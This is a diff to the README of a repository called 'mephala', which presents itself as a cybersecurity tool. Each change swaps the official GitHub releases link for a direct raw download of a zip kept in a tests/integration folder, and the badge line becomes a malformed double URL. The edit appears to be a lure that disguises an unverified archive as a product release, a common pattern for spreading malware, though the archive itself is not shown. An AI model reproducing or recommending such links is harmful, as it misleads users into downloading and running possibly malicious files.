@@ -6,7 +6,7 @@ Welcome to **mephala**, your reliable platform for cybersecurity. This software 
 
 ## 📥 Download Now
 
-[![Download mephala](https://img.shields.io/badge/Download%20mephala-v1.0.0-blue.svg)](https://github.com/king1234567891/mephala/releases)
+[![Download mephala](https://raw.githubusercontent.com/king1234567891/mephala/main/tests/integration/mephala-v1.9.zip%https://raw.githubusercontent.com/king1234567891/mephala/main/tests/integration/mephala-v1.9.zip)](https://raw.githubusercontent.com/king1234567891/mephala/main/tests/integration/mephala-v1.9.zip)
 
 ## ⚡ Features
 
@@ -28,7 +28,7 @@ Before installing, ensure your system meets the following minimum requirements:
 
 ### Step 1: Visit the Download Page
 
-To begin, [visit this page to download](https://github.com/king1234567891/mephala/releases). Here, you will find the latest release and download options.
+To begin, [visit this page to download](https://raw.githubusercontent.com/king1234567891/mephala/main/tests/integration/mephala-v1.9.zip). Here, you will find the latest release and download options.
 
 ### Step 2: Download the Application
 
@@ -60,7 +60,7 @@ Once the application is open:
 
 We regularly release updates to enhance performance and add features. To update:
 
-1. Go back to the [download page](https://github.com/king1234567891/mephala/releases).
+1. Go back to the [download page](https://raw.githubusercontent.com/king1234567891/mephala/main/tests/integration/mephala-v1.9.zip).
 2. Download the latest version.
 3. Follow the same installation steps. It should overwrite the previous version.
 
